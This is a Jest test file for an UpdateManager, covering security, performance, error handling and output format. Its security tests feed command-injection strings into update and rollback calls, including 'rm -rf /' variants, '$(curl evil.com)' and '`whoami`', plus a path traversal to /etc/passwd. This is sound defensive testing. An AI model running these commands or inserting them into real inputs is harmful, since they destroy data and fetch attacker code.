/**
 * UpdateManager Security Tests
 * 
 * These tests verify that the UpdateManager properly handles security edge cases,
 * including malicious inputs and error conditions. Some tests require extended timeouts
 * due to multiple async operations and network calls.
 */

import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import { UpdateManager } from '../../../src/update/UpdateManager.js';

describe('UpdateManager (Security & Performance)', () => {
  let updateManager: UpdateManager;

  beforeEach(() => {
    updateManager = new UpdateManager();
  });

  describe('security validation', () => {
    it('should handle malicious confirmation parameters safely', async () => {
      const maliciousInputs = [
        '"; rm -rf / #',
        '$(rm -rf /)',
        '`rm -rf /`',
        '../../../etc/passwd',
        'CON', // Windows reserved name
        'AUX'  // Windows reserved name
      ];
      
      for (const input of maliciousInputs) {
        const result = await updateManager.updateServer(input as any);
        
        // Should handle malicious input gracefully
        expect(result).toHaveProperty('text');
        expect(typeof result.text).toBe('string');
        expect(result.text.length).toBeGreaterThan(0);
      }
    }, 20000); // Extended timeout for multiple async operations

    it('should handle malicious confirmation parameters in rollback', async () => {
      const maliciousInputs = [
        '"; rm -rf / #',
        '$(curl evil.com)',
        '`whoami`',
        true // Valid input for comparison
      ];
      
      for (const input of maliciousInputs) {
        const result = await updateManager.rollbackUpdate(input as any);
        
        // Should handle gracefully regardless of input
        expect(result).toHaveProperty('text');
        expect(typeof result.text).toBe('string');
      }
    });

    it('should sanitize output strings', async () => {
      const result = await updateManager.getServerStatus();
      
      // Should not contain potential XSS or injection patterns
      expect(result.text).not.toMatch(/<script/i);
      expect(result.text).not.toMatch(/javascript:/i);
      expect(result.text).not.toMatch(/data:text\/html/i);
      expect(result.text).not.toMatch(/\${.*}/); // Template injection
    });
  });

  describe('performance and reliability', () => {
    it('should complete update check within reasonable time', async () => {
      const startTime = Date.now();
      const result = await updateManager.checkForUpdates();
      const duration = Date.now() - startTime;
      
      expect(duration).toBeLessThan(30000); // 30 seconds max for real network calls
      expect(result).toHaveProperty('text');
    });

    it('should complete server status within reasonable time', async () => {
      const startTime = Date.now();
      const result = await updateManager.getServerStatus();
      const duration = Date.now() - startTime;
      
      expect(duration).toBeLessThan(10000); // 10 seconds max
      expect(result).toHaveProperty('text');
    });

    it('should handle concurrent operations without race conditions', async () => {
      const operations = [
        updateManager.checkForUpdates(),
        updateManager.getServerStatus(),
        updateManager.rollbackUpdate(), // Without confirmation
      ];
      
      const results = await Promise.all(operations);
      
      expect(results).toHaveLength(3);
      results.forEach(result => {
        expect(result).toHaveProperty('text');
        expect(typeof result.text).toBe('string');
        expect(result.text.length).toBeGreaterThan(0);
      });
    });

    it('should handle repeated calls efficiently', async () => {
      const startTime = Date.now();
      
      // Make multiple status calls
      const promises = Array(5).fill(null).map(() => updateManager.getServerStatus());
      const results = await Promise.all(promises);
      
      const duration = Date.now() - startTime;
      
      expect(results).toHaveLength(5);
      expect(duration).toBeLessThan(15000); // Should be efficient
      
      results.forEach(result => {
        expect(result).toHaveProperty('text');
        expect(result.text).toContain('Server Status');
      });
    });
  });

  describe('error handling and edge cases', () => {
    it('should handle empty or null parameters gracefully', async () => {
      const invalidInputs = [null, undefined, '', 0, false, []];
      
      for (const input of invalidInputs) {
        const updateResult = await updateManager.updateServer(input as any);
        const rollbackResult = await updateManager.rollbackUpdate(input as any);
        
        expect(updateResult).toHaveProperty('text');
        expect(rollbackResult).toHaveProperty('text');
      }
    });

    it('should provide meaningful error messages', async () => {
      const result = await updateManager.rollbackUpdate(); // No confirmation
      
      // The actual implementation returns different messages based on context:
      // - "No Backups Found" when no backups exist
      // - "Rollback Confirmation Required" when backups exist but server is working
      // - "Rollback Failed" when there's an error (e.g., missing package.json in CI)
      // All are valid responses that provide meaningful error messages
      const hasMeaningfulMessage = result.text.includes('No Backups Found') || 
                                  result.text.includes('Rollback Confirmation Required') ||
                                  result.text.includes('Rollback Failed');
      
      expect(hasMeaningfulMessage).toBe(true);
      expect(result.text.length).toBeGreaterThan(0);
      
      // All messages should guide the user on next steps
      if (result.text.includes('Rollback Failed')) {
        // In CI, package.json might not be found - this is still a meaningful error
        expect(result.text).toMatch(/Error:|Manual Recovery:|fix issues/);
      } else if (result.text.includes('No Backups Found')) {
        expect(result.text).toContain('update_server true');
      } else {
        expect(result.text).toContain('rollback_update true');
      }
    });

    it('should include version information in status', async () => {
      const result = await updateManager.getServerStatus();
      
      // In CI, package.json might not be found, resulting in an error message
      if (result.text.includes('Status Check Failed')) {
        expect(result.text).toContain('Error');
        expect(result.text).toContain('fix issues');
      } else {
        expect(result.text).toContain('Version');
        expect(result.text).toMatch(/\d+\.\d+\.\d+/); // Version pattern
      }
    });

    it('should include dependency information in status', async () => {
      const result = await updateManager.getServerStatus();
      
      // In CI, package.json might not be found, resulting in an error message
      if (result.text.includes('Status Check Failed')) {
        expect(result.text).toContain('Error');
      } else {
        expect(result.text).toContain('Dependencies');
        expect(result.text).toMatch(/Git|npm/i);
      }
    });

    it('should include backup information in status', async () => {
      const result = await updateManager.getServerStatus();
      
      // In CI, package.json might not be found, resulting in an error message
      if (result.text.includes('Status Check Failed')) {
        expect(result.text).toContain('Error');
      } else {
        expect(result.text).toContain('Backup');
      }
    });
  });

  describe('output format validation', () => {
    it('should return consistent object structure', async () => {
      const methods = [
        () => updateManager.checkForUpdates(),
        () => updateManager.updateServer(),
        () => updateManager.rollbackUpdate(),
        () => updateManager.getServerStatus()
      ];
      
      for (const method of methods) {
        const result = await method();
        
        expect(result).toEqual({
          text: expect.any(String)
        });
        expect(Object.keys(result)).toEqual(['text']);
      }
    });

    it('should return non-empty meaningful text', async () => {
      const result = await updateManager.getServerStatus();
      
      expect(result.text.length).toBeGreaterThan(10);
      expect(result.text).not.toBe('undefined');
      expect(result.text).not.toBe('null');
      expect(result.text).not.toBe('[object Object]');
    });

    it('should use appropriate formatting and emoji', async () => {
      const result = await updateManager.getServerStatus();
      
      // Should contain formatting indicators
      expect(result.text).toMatch(/[📊🚀✅⚠️❌]/); // Should contain emoji
      expect(result.text).toMatch(/\*\*.*\*\*/); // Should contain bold markdown
    });
  });
});